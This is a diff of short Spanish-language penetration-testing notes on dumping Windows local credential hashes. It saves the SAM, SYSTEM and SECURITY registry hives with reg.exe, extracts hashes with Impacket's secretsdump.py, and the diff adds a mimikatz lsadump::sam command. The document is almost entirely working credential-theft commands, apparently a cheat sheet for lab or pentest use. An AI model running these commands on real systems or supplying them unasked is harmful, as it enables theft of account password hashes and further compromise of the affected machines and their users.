@@ -8,6 +8,9 @@ reg.exe save hklm\sam C:\sam.save
 reg.exe save hklm\system C:\system.save
 reg.exe save hklm\security C:\security.save
 
+dump con mimikatz:
+lsadump::sam /system:<path_systemFile> /sam:<> /security:<>
+
 Dumpear los hashes con secretdump.py
 python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 
